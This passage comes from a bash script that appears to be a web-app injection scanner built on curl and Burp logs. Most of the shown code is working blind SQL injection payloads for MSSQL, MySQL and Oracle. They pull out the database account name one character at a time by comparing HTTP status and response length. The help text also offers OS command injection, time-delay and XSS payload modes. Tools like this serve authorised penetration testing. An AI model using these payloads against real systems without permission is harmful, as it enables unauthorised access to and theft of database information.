			badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator=case when length((select user from dual)) = 999 then 789 else 0 end$end"`
		else
			echo "Unable to determine DBMS"
			oflag=40
		fi
		encodeinput=$badparams
		encodeme
		badparams=$encodeoutput
		requester
		echo "debug false $request"
		status_false=`echo $response | cut -d ":" -f 1`
		length_false=`echo $response | cut -d ":" -f 2` 
	fi

	if [[ $dbms == "mssql" ]] ; then                            
		badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/(case when (len(system_user) = $oflag) then 789 else 0 end)$end"`
	elif [[ $dbms == "mysql" ]] ; then
		badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/(case when (length(system_user()) = $oflag) then 789 else 0 end)$end"`
	elif [[ $dbms == "oracle" ]] ; then
		badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator=case when length((select user from dual)) = $oflag then 789 else 0 end$end"`
	else
		echo "Unable to determine DBMS"
		oflag=40
	fi

	echo "debug true $request"
		
	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	requester
	#echo "debug sending iflag $request"
	status_true=`echo $response | cut -d ":" -f 1`
	length_true=`echo $response | cut -d ":" -f 2`
			
	((lendiff=$length_true-$length_false))
	gotlength=0
	if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
		gotlength=1
		remessage="SYS USER STRING LENGTH = $oflag"
		echoreporter
		sysuserlen=$oflag
		oflag=40
	fi
	if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
		if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then
			gotlength=1
			remessage="SYS USER STRING LENGTH = $oflag"
			echoreporter
			sysuserlen=$oflag
			oflag=40	
		fi
	fi
	((oflag=$oflag+1)) 
done
###
if [[ $gotlength == 1 ]] ; then
	horiz=$sysuserlen
	oflag=1
	iflag=32
	nambuf=""
	echo "Attempting to brute force the system_user account name. If you get bored hit CNTRL+c to skip. Please wait..."
	while [[ $oflag -le $horiz ]] ; do
		if [[ $iflag == "32" && $oflag == "1" ]] ; then 
			if [[ $dbms == "mssql" ]] ; then                            
				badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/(case when (ascii(substring((select system_user),$oflag,1)) = 999) then 678 else 0 end)$end"`
			elif [[ $dbms == "mysql" ]] ; then
				badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/(case when (ascii(substring(system_user(),$oflag,1)) = 999) then 678 else 0 end)$end"`
			elif [[ $dbms == "oracle" ]] ; then
				badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator=case when ascii(substr((select user from dual),$oflag,1)) = 999 then 678 else 0 end$end"`
			else
				echo "Unable to determine DBMS"
				oflag=40
			fi
			encodeinput=$badparams
			encodeme
			badparams=$encodeoutput
			requester
			#echo "debug sending false $request"
			status_false=`echo $response | cut -d ":" -f 1`
			length_false=`echo $response | cut -d ":" -f 2`
		fi
		if [[ $dbms == "mssql" ]] ; then                            
			badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/(case when (ascii(substring((select system_user),$oflag,1)) =$iflag) then 789 else 0 end)$end"`
		elif [[ $dbms == "mysql" ]] ; then
			badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/(case when (ascii(substring(system_user(),$oflag,1)) = $iflag) then 789 else 0 end)$end"`
		elif [[ $dbms == "oracle" ]] ; then
			badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator=case when ascii(substr((select user from dual),$oflag,1)) = $iflag then 789 else 0 end$end"`
		else
			echo "Unable to determine DBMS"
			oflag=40
		fi
		encodeinput=$badparams
		encodeme
		badparams=$encodeoutput
		requester
		#echo "debug sending true $request"
		status_true=`echo $response | cut -d ":" -f 1`
		length_true=`echo $response | cut -d ":" -f 2`
		((lendiff=$length_true-$length_false))
		if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
			decasciiconv
			echo -n "$output"
			nambuf="$nambuf$output"
			iflag=126
		fi
		if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
			if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then
				decasciiconv
				echo -n "$output"
				nambuf="$nambuf$output"
				iflag=126
			fi
		fi
		((iflag=$iflag+1)) 
		if [[ $iflag == 127 ]] ; then
			((iflag=32))
			((oflag=$oflag+1))
		fi	
	done
	echo ""
	if [[ $nambuf != "" ]] ; then 
		#echo -e '\E[31;48m'"\033[1m[SYS USER IS: $nambuf]\033[0m $method URL: $uhostname$page"?"$badparams"		
		remessage="SYS USER IS: $nambuf"
		echoreporter
	fi
fi
}

lettergrabmssql()
{
###get the length of the string
horiz=40
oflag=1
while [[ $oflag -lt $horiz ]] ; do                             #a' or 789=789/(case when (ascii(substring((select system_user),1,1)) > 0) then 1 else 0 end)$end
	badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/(case when (ascii(substring((select system_user),1,1)) > 255) then 1 else 0 end)$end"`
	#TODO you only need to send the reference request (above) once you dolt! fixme!
	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	requester
	#echo "debug sending $request"
	status_false=`echo $response | cut -d ":" -f 1`
	length_false=`echo $response | cut -d ":" -f 2` 
	badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/(case when (len(system_user) = $oflag) then 1 else 0 end)$end"`
	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	requester
	#echo "debug sending iflag $request"
	status_true=`echo $response | cut -d ":" -f 1`
	length_true=`echo $response | cut -d ":" -f 2`
			
	((lendiff=$length_true-$length_false))
	gotlength=0
	if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
		#echo -e '\E[31;48m'"\033[1m[SYS USER STRING LENGTH = $oflag]\033[0m $method URL: $uhostname$page"?"$badparams"
		gotlength=1
		remessage="SYS USER STRING LENGTH = $oflag"
		echoreporter
		sysuserlen=$oflag
		oflag=40
	fi
	#if [[ "$status_true" == "$status_false" ]] ; then
		#if [[ $lendiff -gt 4 || $lendiff -lt -4 ]] ; then
	#
	#	fi
	#fi
	((oflag=$oflag+1)) 
done
###
if [[ $gotlength == 1 ]] ; then

	horiz=$sysuserlen
	oflag=1
	iflag=32
	nambuf=""
	echo "Attempting to brute force the system_user account name. If you get bored hit CNTRL+c to skip. Please wait..."
	while [[ $oflag -le $horiz ]] ; do
		badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/(case when (ascii(substring((select system_user),$oflag,1)) = $iflag) then 1 else 0 end)$end"`
		encodeinput=$badparams
		encodeme
		badparams=$encodeoutput
		requester
		#echo "debug sending iflag $request"
		status_true=`echo $response | cut -d ":" -f 1`
		length_true=`echo $response | cut -d ":" -f 2`
		badparams=`echo "$cleanoutput" | replace "$testpayload" "$numerator/(case when (ascii(substring((select system_user),1,1)) > 255) then 1 else 0 end)$end"`
		encodeinput=$badparams
		encodeme
		badparams=$encodeoutput
		requester
		#echo "debug sending $request"
		status_false=`echo $response | cut -d ":" -f 1`
		length_false=`echo $response | cut -d ":" -f 2` 
		((lendiff=$length_true-$length_false))
		if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
			decasciiconv
			echo -n "$output"
			nambuf="$nambuf$output"
			iflag=126
		fi
		#if [[ "$status_true" == "$status_false" ]] ; then
			#if [[ $lendiff -gt 4 || $lendiff -lt -4 ]] ; then
		#
		#	fi
		#fi
		((iflag=$iflag+1)) 
		if [[ $iflag == 127 ]] ; then
			((iflag=32))
			((oflag=$oflag+1))
		fi	
	done
	echo ""
	if [[ $nambuf != "" ]] ; then 
		#echo -e '\E[31;48m'"\033[1m[SYS USER IS: $nambuf]\033[0m $method URL: $uhostname$page"?"$badparams"		
		remessage="SYS USER IS: $nambuf"
		echoreporter
	fi
fi
}

lettergrabmysql()
{
###get the length of the string
horiz=40
oflag=1
while [[ $oflag -lt $horiz ]] ; do
	# note that i use the 1 or 1 = (condition) - this is because if 
	# you use an invalid param value you'll get no rows back								  
	badparams=`echo "$cleanoutput" | replace "$testpayload" "1 or 1=(case when (length(system_user()) > 1000) then 1 else 2 end)$end"`
	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	requester
	#echo "debug sending $request"
	status_false=`echo $response | cut -d ":" -f 1`
	length_false=`echo $response | cut -d ":" -f 2` 
	badparams=`echo "$cleanoutput" | replace "$testpayload" "1 or 1=(case when (length(system_user()) = $oflag) then 1 else 2 end)$end"`
	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	requester
	#echo "debug sending iflag $request"
	status_true=`echo $response | cut -d ":" -f 1`
	length_true=`echo $response | cut -d ":" -f 2`
			
	((lendiff=$length_true-$length_false))
	if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
		#echo -e '\E[31;48m'"\033[1m[SYS USER STRING LENGTH = $oflag]\033[0m $method URL: $uhostname$page"?"$badparams"
		remessage="SYS USER STRING LENGTH = $oflag"
		echoreporter
		sysuserlen=$oflag
		oflag=40
	fi
	if [[ "$status_true" == "$status_false" ]] ; then
		if [[ $lendiff -gt 4 || $lendiff -lt -4 ]] ; then
			#echo -e '\E[31;48m'"\033[1m[SYS USER STRING LENGTH = $oflag]\033[0m $method URL: $uhostname$page"?"$badparams"
			remessage="SYS USER STRING LENGTH = $oflag"
			echoreporter
			sysuserlen=$oflag
			oflag=40
		fi
	fi
	((oflag=$oflag+1)) 
done
###
horiz=$sysuserlen
oflag=1
iflag=32
nambuf=""
echo "Attempting to brute force the current MYSQL DB account name. If you get bored hit CNTRL+c to skip. Please wait..."
while [[ $oflag -le $horiz ]] ; do				   
	badparams=`echo "$cleanoutput" | replace "$testpayload" "1 or 1=(case when (ascii(substring(system_user(),$oflag,1)) = $iflag) then 1 else 2 end)$end"`
	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	requester
	#echo "debug sending iflag $request"
	status_true=`echo $response | cut -d ":" -f 1`
	length_true=`echo $response | cut -d ":" -f 2`
	badparams=`echo "$cleanoutput" | replace "$testpayload" "1 or 1=(case when (ascii(substring(system_user(),1,1)) > 255) then 1 else 2 end)$end"`
	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	requester
	#echo "debug sending $request"
	status_false=`echo $response | cut -d ":" -f 1`
	length_false=`echo $response | cut -d ":" -f 2` 
	((lendiff=$length_true-$length_false))
	if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
		decasciiconv
		echo -n "$output"
		nambuf="$nambuf$output"
		iflag=126
	fi
	if [[ "$status_true" == "$status_false" ]] ; then
		if [[ $lendiff -gt 4 || $lendiff -lt -4 ]] ; then
			decasciiconv
			echo -n "$output"
			nambuf="$nambuf$output"
			iflag=126
		fi
	fi
	((iflag=$iflag+1)) 
	if [[ $iflag == 127 ]] ; then
		((iflag=32))
		((oflag=$oflag+1))
	fi	
done
echo ""
if [[ $nambuf != "" ]] ; then 
	#echo -e '\E[31;48m'"\033[1m[SYS USER IS: $nambuf]\033[0m $method URL: $uhostname$page"?"$badparams"		
	remessage="SYS USER IS: $nambuf"
	echoreporter
fi
}

lettergraboracle()
{
###get the length of the string
horiz=40
oflag=1
while [[ $oflag -lt $horiz ]] ; do				 #  1 or 1=case when length((select user from dual)) = 2 then 1 else 2 end		  
	badparams=`echo "$cleanoutput" | replace "$testpayload" "1 or 1=case when length((select user from dual)) > 1000 then 1 else 2 end$end"`
	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	requester
	#echo "debug sending $request"
	status_false=`echo $response | cut -d ":" -f 1`
	length_false=`echo $response | cut -d ":" -f 2`          #  1 or 1=case when length((select user from dual)) = 2 then 1 else 2 end
	badparams=`echo "$cleanoutput" | replace "$testpayload" "1 or 1=case when length((select user from dual)) = $oflag then 1 else 2 end$end"`
	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	requester
	#echo "debug sending iflag $request"
	status_true=`echo $response | cut -d ":" -f 1`
	length_true=`echo $response | cut -d ":" -f 2`
			
	((lendiff=$length_true-$length_false))
	if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
		#echo -e '\E[31;48m'"\033[1m[SYS USER STRING LENGTH = $oflag]\033[0m $method URL: $uhostname$page"?"$badparams"
		remessage="USER STRING LENGTH = $oflag"
		echoreporter
		sysuserlen=$oflag
		oflag=40
	fi
	if [[ "$status_true" == "$status_false" ]] ; then
		if [[ $lendiff -gt 4 || $lendiff -lt -4 ]] ; then
			#echo -e '\E[31;48m'"\033[1m[SYS USER STRING LENGTH = $oflag]\033[0m $method URL: $uhostname$page"?"$badparams"
			remessage="USER STRING LENGTH = $oflag"
			echoreporter
			sysuserlen=$oflag
			oflag=40
		fi
	fi
	((oflag=$oflag+1)) 
done
###
horiz=$sysuserlen
oflag=1
iflag=32
nambuf=""
echo "Attempting to brute force the current ORACLE DB account name. If you get bored hit CNTRL+c to skip. Please wait..."
while [[ $oflag -le $horiz ]] ; do				   #1 or 1=case when ascii(substr((select user from dual),1,1)) < 255 then 1 else 2 end
	badparams=`echo "$cleanoutput" | replace "$testpayload" "1 or 1=case when ascii(substr((select user from dual),$oflag,1)) = $iflag then 1 else 2 end$end"`
	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	requester
	#echo "debug sending iflag $request"
	status_true=`echo $response | cut -d ":" -f 1`
	length_true=`echo $response | cut -d ":" -f 2`             #1 or 1=case when ascii(substr((select user from dual),1,1)) < 255 then 1 else 2 end
	badparams=`echo "$cleanoutput" | replace "$testpayload" "1 or 1=case when ascii(substr((select user from dual),1,1)) > 255 then 1 else 2 end$end"`
	encodeinput=$badparams
	encodeme
	badparams=$encodeoutput
	requester
	#echo "debug sending $request"
	status_false=`echo $response | cut -d ":" -f 1`
	length_false=`echo $response | cut -d ":" -f 2` 
	((lendiff=$length_true-$length_false))
	if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
		decasciiconv
		echo -n "$output"
		nambuf="$nambuf$output"
		iflag=126
	fi
	if [[ "$status_true" == "$status_false" ]] ; then
		if [[ $lendiff -gt 4 || $lendiff -lt -4 ]] ; then
			decasciiconv
			echo -n "$output"
			nambuf="$nambuf$output"
			iflag=126
		fi
	fi
	((iflag=$iflag+1)) 
	if [[ $iflag == 127 ]] ; then
		((iflag=32))
		((oflag=$oflag+1))
	fi	
done
echo ""
if [[ $nambuf != "" ]] ; then 
	#echo -e '\E[31;48m'"\033[1m[SYS USER IS: $nambuf]\033[0m $method URL: $uhostname$page"?"$badparams"		
	remessage="SYS USER IS: $nambuf"
	echoreporter
fi
}


decasciiconv()
{
output=""
case $iflag in 
32) output=" " ;;
33) output="!" ;;
34) output=" " ;;
35) output="#" ;;
36) output="$" ;;
37) output="%" ;;
38) output="&" ;;
39) output="'" ;;
40) output=" " ;;
41) output=" " ;;
42) output="*" ;;
43) output="+" ;;
44) output="," ;;
45) output="-" ;;
46) output="." ;;
47) output="/" ;;
48) output=0 ;;
49) output=1 ;;
50) output=2 ;;
51) output=3 ;;
52) output=4 ;;
53) output=5 ;;
54) output=6 ;;
55) output=7 ;;
56) output=8 ;;
57) output=9 ;;
58) output=":" ;;
59) output=";" ;;
60) output="<" ;;
61) output="=" ;;
62) output=">" ;;
63) output="?" ;;
64) output="@" ;;
65) output=A ;;
66) output=B ;;
67) output=C ;;
68) output=D ;;
69) output=E ;;
70) output=F ;;
71) output=G ;;
72) output=H ;;
73) output=I ;;
74) output=J ;;
75) output=K ;;
76) output=L ;;
77) output=M ;;
78) output=N ;;
79) output=O ;;
80) output=P ;;
81) output=Q ;;
82) output=R ;;
83) output=S ;;
84) output=T ;;
85) output=U ;;
86) output=V ;;
87) output=W ;;
88) output=X ;;
89) output=Y ;;
90) output=Z ;;
91) output="[" ;;
92) output=" " ;;
93) output="]" ;;
94) output="^" ;;
95) output="_" ;;
96) output=" " ;;
97) output=a ;;
98) output=b ;;
99) output=c ;;
100) output=d ;;
101) output=e ;;
102) output=f ;;
103) output=g ;;
104) output=h ;;
105) output=i ;;
106) output=j ;;
107) output=k ;;
108) output=l ;;
109) output=m ;;
110) output=n ;;
111) output=o ;;
112) output=p ;;
113) output=q ;;
114) output=r ;;
115) output=s ;;
116) output=t ;;
117) output=u ;;
118) output=v ;;
119) output="w" ;;
120) output=x ;;
121) output=y ;;
122) output=z ;;
123) output="{" ;;
124) output="|" ;;
125) output="}" ;;
126) output="~" ;;
esac
}

##### END OF FUNCTION DEFINITIONS SECTION ######	
#remove any residual files left lying about: 
rm cleanscannerinputlist.txt 2>/dev/null
rm 0 2>/dev/null
rm dump 2>/dev/null
rm dumpfile 2>/dev/null
rm search.txt 2>/dev/null
rm scannerinputlist.txt 2>/dev/null
rm 1scannerinputlist.txt 2>/dev/null
rm search.txt 2>/dev/null
rm dumpfile 2>/dev/null
rm dump 2>/dev/null
rm 2scannerinputlist.txt 2>/dev/null
rm dump.txt.txt 2>/dev/null
rm parameters_to_skip.txt 2>/dev/null
rm payloads.txt 2>/dev/null
rm outputheader.txt 2>/dev/null
rm search.txt 2>/dev/null


#initialise some of the logic flags to false:
n=false
s=false
q=false
m=false
e=false
h=false
x=false
u=false
curlproxy=""
P=false
b=false
C=false
f=false
o=false
D=false
G=false

#################command switch parser section#########################

while getopts l:c:t:nsqehx:d:bu:P:v:L:M:Q:I:T:C:rWS:ABjYfoD:FG namer; do
    case $namer in 
    l)  #path to burp log to parse
        burplog=$OPTARG
        ;;
    D)  #back end dbms
	D=true
        dbms=$OPTARG
        ;;
    o)  #OVERRIDE NON TESTING OF LOGIN
	o=true
        ;;
    c)  #cookie to add to requests
        cookie=$OPTARG
        ;;
    t)  #target hostname/ip
        uhostname=$OPTARG
        ;;    
    T)  #url to test a connection to
        T=true
	testurl=$OPTARG
        ;;
    n)  #use numeric injection payloads
        n=true
        ;;
    f)  #fulsh out the session file
        f=true
        ;;
    s)  #use string injection payloads
        s=true
        ;;
    q)  #use quote injection payloads 
        q=true
        ;;
    r)  #use encoded quote injection payloads 
        r=true
        ;;
    e)  #use SQL time delay injection payloads 
        e=true
        ;;
    b)  #use OS command injection delay payloads
        b=true
        ;;     
    h)  #help!
        h=true
        ;;
    x) # time delay duration
        x=true
	timedelay=$OPTARG
        ;;
    d) # default error string used to ID a default error page
        d=true
	ErrorString=$OPTARG
        ;;
    j) # default error string used to ID a default error page
        j=true
	 ;;
    A) # null mode
        A=true
        ;;  
    B) # CRLF mode
        B=true
        ;;  
    v) # set a curl proxy
        v=true
	curlproxy=$OPTARG
        ;;
    P) # parse the log and create an input file
        P=true
	parseOutputFile=$OPTARG
        ;;    
    I) # Use an input file file, not a burp log
        I=true
	inputFile=$OPTARG
        ;;    
    L) # Session cookie liveness check GET URL
        L=true
	canaryRequest=$OPTARG
        ;;
    M) # Session cookie liveness check search string
        M=true
	canaryRequestSearchString=$OPTARG
        ;;
    Q) # Session cookie liveness check search string
        Q=true
	resumeline=$OPTARG
        ;;    
    C) # Custom payload list
        C=true
	custompayloadlist=$OPTARG
        ;;
    W) # Method swapping mode
        W=true
        ;;
    S) # parameters to skip
        S=true
	parameterstoskip=$OPTARG
        ;;
    Y) # parameters to skip
        Y=true
	;;
    F) # Dont skip params that have already been scanned
        F=true
	;;
    G) # Dont perform the normal connection test
        G=true
	;;
    esac
done

# help mode activated
if [ true = "$h" ] || ["$1" == ""] 2>/dev/null ; then
	echo "$0 - A wrapper for curl written in bash :-)"
	echo "Written by Toby Clarke"
	echo "Influenced by code written by Brian Holyfield"
	echo "Common errors strings taken from Adam Muntner's fuzzdb regex/errors.txt"
	echo ""
	echo "Required arguments:"
	echo "  -t <host> Target hostname or IP address. No trailing slash."
	echo "AND one of:"
	echo "  -l <burplog> Path to the burp log file that will be parsed for requests. NOT a burp state file, but a log created in Burp > options > logging"
	echo "  -I <input file to use> Parse an input file, not a burp log. Input files can be created using the -P switch"
	echo "OR just:" 
	echo "  -T <test URL> Test mode: define a test URL to attempt a connection to. Also may require -c <cookie> to connect"
	echo "OR:"
	echo "  -P <input file to create> Parse mode: create an input file from a burp log. This can subsequently be scanned using the -I option. Also requires -l <burplog> to parse"	
	echo "AND one or more of the following payload types:"
	echo "  -s String injection"
	echo "  -n Numeric injection"
	echo "  -q Quote injection"	
	echo "  -r Quote injection with various encodings"	
	echo "  -e SQL delay injection"
        echo "  -b OS Command injection"
        echo "  -C <path to payload list text file> Use a custom payload list. Where the character 'X' is included in a payload, it may be replaced with a time delay value."
        echo "  -Y XSS injection (very basic!)"
	echo "Optional arguments:"
	echo "   Payload modifiers:"
	echo "  -A Prepend payloads with %00"
	echo "  -B Prepend payloads with %0d%0a"
	echo "  -W HTTP Method Swapping mode: GET requests are converted to POSTs and vice-versa. These new requests are tested IN ADDITION to the original."
	echo "Various extra options:"	
	echo "  -D <mssql, oracle, mysql> Specify a back end DBMS if known. Reduces the number of payloads. Options are currently mssql, oracle or mysql"
	echo "  -x <delay in seconds> Time delay for SQL and command injection - if not provided, this will default to $timedelay seconds"
	echo "  -c <cookie> Add cookies. Enclose in single quotes: -c 'foo=bar'. Multiple cookies must be defined without spaces: -c 'foo=bar;sna=fu'"
	echo "  -d <default error string> Define a detection string (inside double quotes) to identify a default error page"
	echo "  -v <http://proxy:port> Define a proxy. Currently, I crash burp. Dont know why."
	echo "  -L <URL of session liveness check page> Conduct an access check on a given page to determine the session cookie is valid"	
        echo "  -M <Search string> String to search for in session liveness check page. Replace spaces with periods: 'Welcome user Bob' should be 'Welcome.user.Bob'"
        echo "  -Q <Request number> Resume a halted scan at a given request number"        
	echo "  -T <Test URL> Test mode: define a test URL to attempt a connection to. Also may require -c <cookie> to connect"
	echo "  -S <file containing parameters to skip, each parameter on a seperate line> Define one or many parameters NOT to scan"
	echo "  -o Override the typical behaviour of excluding any requests which include the following phrases: logoff, logout, exit, signout, delete, signoff"
	echo "  -F Override the typical behaviour of skipping parameters that have already been scanned. Increases scan time, but scans every parameter of every request"
	echo "Some examples:"
	echo "A string, numeric and time-based SQL injection scan based on a burp log:"
	echo "  $0 -t http://www.foo.bar -l example-burp.log -sne"
	echo "Using Parse mode to create an input file from a burp log file:"
	echo "  $0 -l example-burp.log -P example-burp.input"
	echo "A scan based on an input file, injecting encoded quote payloads with a leading null character and using method swapping:"
	echo "  $0 -t http://192.168.2.21 -I example-burp.input -rAW"
	echo "Runtime hints: CNTRL+c to skip out of a loop and scan the next URL, CNTRL+z to stop scanning altogether, re-run with the same values to resume an incomplete scan"	
	exit
fi

#no burplog or input file specified:
if [[ "$burplog" == "" && "$inputFile" == "" && "$testurl" == "" ]] ; then
	echo "FATAL: I need a burplog or an input file to parse." >&2
	echo "-l <burplog> or -I <input file>">&2
	exit
fi

#no hostname provided:
if [[ "$uhostname" == "" && "$burplog" == "" && "$testurl" == "" ]]; then
	echo "FATAL: I need a hostname (no trailing slash)." >&2
	echo "-t <host>">&2
	exit
fi

#hostname has a trailing slash:
lastchar="${uhostname: -1}"
if [[ "$lastchar" == "/" ]] ; then
	echo "FATAL: hostname $uhostname has a trailing slash. Please re-run the scan and remove the slash at the end of the hostname."
	exit
fi

#if we are not creating an input file from a burp log (-P), and no payloads have been specified, ask for a payload:
if [[ true != "$P" && true != "$T" && true != "$Y" && true != "$s" && true != "$n" && true != "$q" && true != "$e" && true != "$b" && true != "$C" && true != "$r" && true != "$j" ]]; then
	echo "FATAL: I need a payload type" >&2
	echo "Some examples are: -s, -n, -q, -r, -e, -b, -Y, -C" >&2
	exit
fi

# this fixes weird behaviour if no cookie value is given by setting a stupid cookie
if [[ "$cookie" == "" ]]; then
	echo "Cookie not provided. Setting cookie to foo=bar" >&2
	cookie="foo=bar"
fi

safefilename=`echo $uhostname-$(date)| replace " " "-" | replace "//" "" | replace ":" "."`
safehostname=`echo $uhostname | replace " " "-" | replace "//" "" | replace ":" "."`

#this just sets curls -k option which means that it will handle cert errors without borking
protocol=`echo $uhostname| cut -d ":" -f 1` 
if [[ "$protocol" == "https" ]]; then
	httpssupport="-k"
else
	httpssupport=""	
fi

#unless we are using an .input file, the safelogname should be the $burplog path value
if [[ true != "$I" ]]; then
	safelogname=`echo $burplog | replace " " "" | replace "/" "SLASH" | replace ":" "." | replace '\' ''`
else
	safelogname=`echo $inputFile | replace " " "" | replace "/" "SLASH" | replace ":" "." | replace '\' ''`
fi


### session file checking / creation code ###
# the idea here is that the user should be happy killing and resuming a scan.
# this is facilitated by saving the scan progress (specifically the request 
# or "URL number" last scanned) in a session file and then checking for the 
# presence of this file whenever a scan is launched

if [ true != "$Q" ] ; then
	#echo "Checking for session file."
	if [ true = "$f" ] ; then
		rm ./session/$safehostname.$safelogname.session.txt 2>/dev/null
	fi
	session=''
	session=`cat ./session/$safehostname.$safelogname.session.txt 2>/dev/null`
	if [[ "$session" != "" ]]; then
		echo "Session file found at ./session/$safehostname.$safelogname.session.txt"
		echo "Looks like you've scanned this host before." 	
		echo "Do you want to resume from the last URL scanned: ($session)?"
		echo -n "Enter y at the prompt to resume from URL $session or n to start from the first URL: "
		read choice
		if [[ "$choice" == "y" ]]; then
			echo "Resuming scan from URL $session"		
			resumeline=$session
			Q=true
		else 
			echo "Starting from the first URL"
			resumeline=0
		fi
		# put your input file recovery code here 
		#echo "Session file found at ./session/$safehostname.$safelogname.session.txt"
		#./session/$safehostname.$safelogname.input
		#echo "Checking for .input file"
		inputCheck=`wc ./session/$safehostname.$safelogname.input 2>/dev/null` 
		if [[ "$inputCheck!" != "" ]] ; then
			echo "Input file found at ./session/$safehostname.$safelogname.input"
			echo -n "Enter y at the prompt to create a fresh .input file or n to use the previously created .input file: "
			read choice
			if [[ "$choice" == "y" ]]; then
				echo "Re-using the .input file at ./session/$safehostname.$safelogname.input"		
				I=true
				inputFile="./session/$safehostname.$safelogname.input"
			else 
				echo "Creating a fresh .input file from the burp log"
			fi
		fi
	else 
		echo "Session file not found. Creating ./session/$safehostname.$safelogname.session.txt and starting from the first URL"
	fi
else
	echo "Resuming scan at request $resumeline"
fi

#################burplog parser section#########################

########BURPLOG PARSING SECTION############

#if the user hasn't provided an input file, or a test URL, they must have provided a burp log to parse: 
if [[ true != "$I" && true != "$T" ]] ; then
	rm 1scannerinputlist.txt 2>/dev/null
	rm scannerinputlist.txt 2>/dev/null
	
	burplines=`wc -l $burplog | cut -d " " -f 1`
	echo "Parsing burp log $burplog with $burplines lines"  
		
	########BURPLOG ANALYSIS SECTION############

	N=0
	lineflag=0
	fileflag=0
	captureflag=0
	#the below get re-used later on in the code - dont change them
	#for some reason it seemed easier to define these and then match against the definition
	equalcheck="======================================================"
	get="GET "
	get2="GET"
	post="POST "
	post2="POST" 
	question="\?"
	colon=":"
	equals="="
	#initialise some variables:
	postflag=0
	postdataflag=0
	postURIflag=0
	
	# this next block of code is a 'for' loop over the list of entries in the $burplog txt file.
	# its purpose is to translate a burp log into .input format, which is a list of lines like this:
	# GET /foobar.php?sna=fu 
	# i use a 'while | read' instead of a 'for' because this can handle lines with spaces in. if 
	# you use a 'for' loop in bash it treats spaces as delimiters by default - 'while | read' is 
	# one way to get bash to treat each line as a whole regardless of spaces
	cat $burplog | while read LINE ; do
		if [ $lineflag == 2 ]; then
			#two =========== lines gone past: this is the trigger to start capturing data"
			captureflag=1
			counter=$((counter+1))
		fi
	
		if [ $lineflag == 3 ]; then
			#three =========== lines gone past: this is the trigger to stop capturing data"
			captureflag=0		
			#reset the flag that counts the number of ============= lines that have passed by:
			lineflag=0
			echo -n "." 
		fi
		if [ $captureflag == 1 ]; then
		# we are capturing burp log info:
		# first question: is it a POST or GET request?
			if [[ $LINE =~ $get && $LINE =~ $question ]]; then
				# GET detected the next line takes a line like:"
				# GET /foobar.asp?snafu=yep HTTP/1.1
				# and outputs:
				# GET /foobar.asp?snafu=yep				
				getline=`echo "$LINE" | cut -d " " -f 1,2`
				echo $getline >> 1scannerinputlist.txt
			fi
			#this code includes support for POST URI parameters:
			if [[ $LINE =~ $post && $LINE =~ $question ]]; then
				# POST with URI parameters detected. Store in the 'outer' variable, a line such as:"
				# /foobar.asp?snafu=yep				
				outer=`echo "$LINE" | cut -d " " -f 2`;
				postflag=1
				postURIflag=1			
			fi
			if [[ $LINE =~ $post && !($LINE =~ $question) ]]; then
				# 'Normal' POST detected:
				# as before with the URI POST, we chop off the 'POST ' and 'HTTP/1.1' feilds either 
				# side of the URI, to store in the 'outer' variable something like:
				# /foobar.asp
				outer=`echo "$LINE" | cut -d " " -f 2`
				# raise the postflag: we are hunting for the postdata now:
				postflag=1
			fi
			if [ $postflag == 1 ]; then
				#this is my lame postdata matching condition:
				#the post data has an "=" and DOESENT have a ":" (keeps the headers away from the door...)
				#TODO sharpen this test up a bit!
				if [[ $LINE =~ $equals && !($LINE =~ $colon) && !($LINE =~ $question) ]]; then
 					if [ $postURIflag == 1 ]; then
						echo "POST" $outer"??"$LINE  >> 1scannerinputlist.txt
						# In the case of a POST with URI parameters, POST body parameters are preceded with ??, like this:
						# POST /foobar.aspx?URIparam=1??bodyparam=2
						postURIflag=0
					else
						echo "POST" $outer"?"$LINE  >> 1scannerinputlist.txt
						# In the case of a 'normal' POST request, POST body parameters are preceded with ?, like this:
						# POST /foobar.aspx?bodyparam=2
						
					fi
				#reset the post flag in preparation for parsing the next request:
				postflag=0
				fi
			fi
		fi
		
		#echo "Line $N = $LINE"
		if [[ $LINE =~ $equalcheck ]]; then
			# lineflag increments with long lines of '=' characters. burp logs use three of these lines to capture a single request.
			# when lineflag=1 we have a request, when lineflag=2 we capture the next line, when lineflag=3 we have seen the whole of the request: 
			# ======================================================
			# 1:50:18 PM  http://192.168.182.136:80
			# ======================================================
			# POST /dvwa/vulnerabilities/exec/ HTTP/1.1
			# Host: 192.168.182.136
			# Referer: http://192.168.182.136/dvwa/vulnerabilities/exec/
